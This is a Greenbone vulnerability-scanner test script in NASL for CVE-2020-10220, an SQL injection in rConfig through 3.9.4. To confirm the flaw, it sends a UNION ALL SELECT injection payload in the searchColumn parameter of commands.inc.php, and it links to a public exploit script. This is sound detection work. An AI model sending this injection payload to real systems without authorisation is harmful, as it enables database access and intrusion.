# Copyright (C) 2020 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later # See https://spdx.org/licenses/
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113651");
  script_version("2020-03-09T14:55:29+0000");
  script_tag(name:"last_modification", value:"2020-03-10 11:03:30 +0000 (Tue, 10 Mar 2020)");
  script_tag(name:"creation_date", value:"2020-03-09 14:56:57 +0200 (Mon, 09 Mar 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_cve_id("CVE-2020-10220");

  script_name("rConfig <= 3.9.4 SQLi Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_rconfig_detect.nasl");
  script_mandatory_keys("rconfig/detected");

  script_tag(name:"summary", value:"rConfig is prone to an SQL injection (SQLi) vulnerability.");
  script_tag(name:"vuldetect", value:"Tries to execute an SQL query on the target system.");
  script_tag(name:"insight", value:"The vulnerability is exploitable via the searchColumn parameter in commands.inc.php.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to read sensitive information
  and execute arbitrary code on the target machine.");
  script_tag(name:"affected", value:"rConfig through version 3.9.4.");
  script_tag(name:"solution", value:"No known solution is available as of 09th March, 2020.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_sqli.py");

  exit(0);
}

CPE = "cpe:/a:rconfig:rconfig";

include( "host_details.inc" );
include( "misc_func.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );

if( location == "/" )
  location = "";

vt_strings = get_vt_strings();

attack_url = location + "/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command%20UNION%20ALL%20SELECT%200x" + toupper(vt_strings["default_rand_hex"]) + ",NULL--";
res = http_get_cache( port: port, item: attack_url );

if( res =~ 'id="' + vt_strings["default_rand"]  + '"' ) {
  report = 'It was possible to execute an SQL command.\n';
  report += report_vuln_url( port: port, url: attack_url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
